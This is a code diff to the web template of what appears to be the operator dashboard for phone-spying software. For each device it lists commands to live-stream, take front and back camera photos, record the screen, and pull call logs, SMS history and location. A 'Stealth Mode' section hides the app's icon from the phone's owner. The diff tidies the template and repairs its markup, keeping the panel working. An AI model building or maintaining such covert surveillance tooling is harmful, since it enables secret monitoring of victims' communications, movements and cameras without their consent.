@@ -166,85 +166,59 @@
                 Remote Control Center
             </h2>
             <div id="device-controls" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-                <% var deviceIds=Object.keys(data.devices || {}); var devicesInfo=data.devices_info || {}; %>
-                    <% if(deviceIds.length===0) { %>
-                        <p class="text-slate-500 text-xs italic">Waiting for devices to sync User-ID... (Try taking a
-                            photo or sending a log from the app)</p>
-                        <% } %>
-                            <% deviceIds.forEach(function(deviceId){ var info=devicesInfo[deviceId] || {}; var
-                                lastSeen=info.lastSeen || 'Unknown' ; // Simple "Online" logic: if pinged in last 2
-                                minutes var isOnline=false; try { var now=new Date(); var seen=new Date(lastSeen); if
-                                ((now - seen) < 120000) isOnline=true; } catch(e) {} %>
-                                <div
-                                    class="bg-white/5 border border-white/10 rounded-xl p-4 transition-all hover:bg-white/10">
-                                    <div class="flex justify-between items-start mb-3">
-                                        <div>
-                                            <p class="text-[0.65rem] text-slate-500 uppercase font-bold">Device ID</p>
-                                            <p class="text-xs font-mono text-violet-300">
-                                                <%= deviceId %>
-                                            </p>
-                                            <p class="text-[0.6rem] text-slate-400 mt-1">Last Seen: <span
-                                                    class="text-slate-200">
-                                                    <%= lastSeen %>
-                                                </span></p>
-                                        </div>
-                                        <% if(isOnline) { %>
-                                            <span
-                                                class="badge bg-emerald-900/40 text-emerald-400 border border-emerald-500/20 flex items-center">
-                                                <span
-                                                    class="w-1.5 h-1.5 rounded-full bg-emerald-500 mr-1.5 animate-pulse"></span>
-                                                Online
-                                            </span>
-                                            <% } else { %>
-                                                <span
-                                                    class="badge bg-slate-800 text-slate-400 border border-slate-700">Offline</span>
-                                                <% } %>
-                                    </div>
-                                    <div class="grid grid-cols-2 gap-2">
-                                        <button onclick="sendCommand('<%= deviceId %>', 'start_live_stream')"
-                                            class="cmd-btn bg-rose-500/20 text-rose-300 border-rose-500/40">🔴 Start
-                                            Live</button>
-                                        <button onclick="sendCommand('<%= deviceId %>', 'stop_live_stream')"
-                                            class="cmd-btn">⏹ Stop Live</button>
-                                        <button onclick="sendCommand('<%= deviceId %>', 'front_photo')" class="cmd-btn">
-                                            🤳 Front Cam
-                                        </button>
-                                        <button onclick="sendCommand('<%= deviceId %>', 'back_photo')" class="cmd-btn">
-                                            📸 Back Cam
-                                        </button>
-                                        <button onclick="sendCommand('<%= deviceId %>', 'record_screen')"
-                                            class="cmd-btn">
-                                            🎬 Rec Screen
-                                        </button>
-                                        <button onclick="sendCommand('<%= deviceId %>', 'extract_call_logs')"
-                                            class="cmd-btn">
-                                            📞 Call Logs
-                                        </button>
-                                        <button onclick="sendCommand('<%= deviceId %>', 'extract_sms_history')"
-                                            class="cmd-btn">
-                                            ✉️ SMS Hist
-                                            <button onclick="sendCommand('<%= deviceId %>', 'extract_location')"
-                                                class="cmd-btn">
-                                                📍 Location
-                                            </button>
-
-                                            <!-- STEALTH TOGGLES -->
-                                            <div class="w-full flex gap-2 pt-2 border-t border-white/10 mt-2 flex-wrap">
-                                                <span
-                                                    class="w-full text-xs text-slate-400 font-semibold mb-1 uppercase tracking-wider">Stealth
-                                                    Mode</span>
-                                                <button onclick="sendCommand('<%= deviceId %>', 'hide_app')"
-                                                    class="cmd-btn" style="background: rgba(153,27,27,0.8);">
-                                                    🥷 Hide App Icon
-                                                </button>
-                                                <button onclick="sendCommand('<%= deviceId %>', 'show_app')"
-                                                    class="cmd-btn" style="background: rgba(21,128,61,0.8);">
-                                                    👁️ Show App Icon
-                                                </button>
-                                            </div>
-                                    </div>
+                <% 
+                   var deviceIds = Object.keys(data.devices || {}); 
+                   var devicesInfo = data.devices_info || {}; 
+                %>
+                <% if(deviceIds.length === 0) { %>
+                    <p class="text-slate-500 text-xs italic col-span-full">Waiting for devices to sync User-ID... (Try taking a photo or sending a log from the app)</p>
+                <% } else { %>
+                    <% deviceIds.forEach(function(deviceId){ 
+                        var info = devicesInfo[deviceId] || {}; 
+                        var lastSeen = info.lastSeen || 'Unknown'; 
+                        var isOnline = false; 
+                        try { 
+                            var now = new Date(); 
+                            var seen = new Date(lastSeen); 
+                            if ((now - seen) < 120000) isOnline = true; 
+                        } catch(e) {} 
+                    %>
+                        <div class="bg-white/5 border border-white/10 rounded-xl p-4 transition-all hover:bg-white/10">
+                            <div class="flex justify-between items-start mb-3">
+                                <div>
+                                    <p class="text-[0.65rem] text-slate-500 uppercase font-bold">Device ID</p>
+                                    <p class="text-xs font-mono text-violet-300"><%= deviceId %></p>
+                                    <p class="text-[0.6rem] text-slate-400 mt-1">Last Seen: <span class="text-slate-200"><%= lastSeen %></span></p>
                                 </div>
-                                <% }); %>
+                                <% if(isOnline) { %>
+                                    <span class="badge bg-emerald-900/40 text-emerald-400 border border-emerald-500/20 flex items-center">
+                                        <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 mr-1.5 animate-pulse"></span>
+                                        Online
+                                    </span>
+                                <% } else { %>
+                                    <span class="badge bg-slate-800 text-slate-400 border border-slate-700">Offline</span>
+                                <% } %>
+                            </div>
+                            <div class="grid grid-cols-2 gap-2">
+                                <button onclick="sendCommand('<%= deviceId %>', 'start_live_stream')" class="cmd-btn bg-rose-500/20 text-rose-300 border-rose-500/40">🔴 Start Live</button>
+                                <button onclick="sendCommand('<%= deviceId %>', 'stop_live_stream')" class="cmd-btn">⏹ Stop Live</button>
+                                <button onclick="sendCommand('<%= deviceId %>', 'front_photo')" class="cmd-btn">🤳 Front Cam</button>
+                                <button onclick="sendCommand('<%= deviceId %>', 'back_photo')" class="cmd-btn">📸 Back Cam</button>
+                                <button onclick="sendCommand('<%= deviceId %>', 'record_screen')" class="cmd-btn">🎬 Rec Screen</button>
+                                <button onclick="sendCommand('<%= deviceId %>', 'extract_call_logs')" class="cmd-btn">📞 Call Logs</button>
+                                <button onclick="sendCommand('<%= deviceId %>', 'extract_sms_history')" class="cmd-btn">✉️ SMS Hist</button>
+                                <button onclick="sendCommand('<%= deviceId %>', 'extract_location')" class="cmd-btn">📍 Location</button>
+                            </div>
+
+                            <!-- STEALTH TOGGLES -->
+                            <div class="w-full flex gap-2 pt-2 border-t border-white/10 mt-2 flex-wrap">
+                                <span class="w-full text-xs text-slate-400 font-semibold mb-1 uppercase tracking-wider">Stealth Mode</span>
+                                <button onclick="sendCommand('<%= deviceId %>', 'hide_app')" class="cmd-btn" style="background: rgba(153,27,27,0.8);">🥷 Hide App Icon</button>
+                                <button onclick="sendCommand('<%= deviceId %>', 'show_app')" class="cmd-btn" style="background: rgba(21,128,61,0.8);">👁️ Show App Icon</button>
+                            </div>
+                        </div>
+                    <% }); %>
+                <% } %>
             </div>
         </section>
 
